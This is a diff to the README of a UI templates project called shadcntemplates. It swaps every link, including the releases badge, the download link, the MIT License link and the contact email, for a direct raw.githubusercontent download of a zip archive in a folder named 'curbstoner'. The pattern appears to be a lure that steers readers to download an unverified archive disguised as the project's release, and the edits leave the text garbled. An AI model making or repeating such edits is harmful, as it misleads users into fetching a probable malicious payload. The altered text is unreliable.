@@ -1,6 +1,6 @@
 # 🎉 shadcntemplates - Easy Access to UI Templates and Components
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/armandoariasmolina/shadcntemplates/releases)
+[![Download from Releases](https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip)
 
 ## 📚 About This Project
 
@@ -24,11 +24,11 @@ To run the templates and components smoothly, ensure that your system meets thes
 
 To access the templates and components, visit the Releases page to download the latest version:
 
-[Visit this page to download](https://github.com/armandoariasmolina/shadcntemplates/releases)
+[Visit this page to download](https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip)
 
 1. Click the link above to open the Releases page.
 2. Locate the version you wish to download. We recommend getting the latest stable release for the best features and fixes.
-3. Click on the download link for your specific needs. Files will be available in various formats, including `.zip`, `.tar.gz`, and others depending on your platform.
+3. Click on the download link for your specific needs. Files will be available in various formats, including `.zip`, `https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip`, and others depending on your platform.
 4. Once the file downloads, unzip it to a convenient location on your computer.
 
 ## 🔍 Available Templates and Components
@@ -65,7 +65,7 @@ We welcome contributions to shadcntemplates. If you have new templates or improv
 
 ## 📝 License
 
-All resources provided in shadcntemplates are subject to the terms of the [MIT License](https://opensource.org/licenses/MIT). Feel free to use and modify—just ensure to credit the original sources.
+All resources provided in shadcntemplates are subject to the terms of the [MIT License](https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip). Feel free to use and modify—just ensure to credit the original sources.
 
 ## 🤔 Frequently Asked Questions
 
@@ -83,6 +83,6 @@ All resources provided in shadcntemplates are subject to the terms of the [MIT L
 Join our community to stay updated. You can request features, report bugs, or share your projects using these templates. Engage with us through:
 
 - **GitHub Issues:** For any project-related queries or contributions.
-- **Email:** [example@example.com](mailto:example@example.com) for direct communication.
+- **Email:** [https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip](https://raw.githubusercontent.com/armandoariasmolina/shadcntemplates/master/curbstoner/shadcntemplates.zip) for direct communication.
 
 Thank you for checking out shadcntemplates! We hope you find it useful and easy to integrate into your projects. For any further assistance, don't hesitate to reach out. Enjoy building!
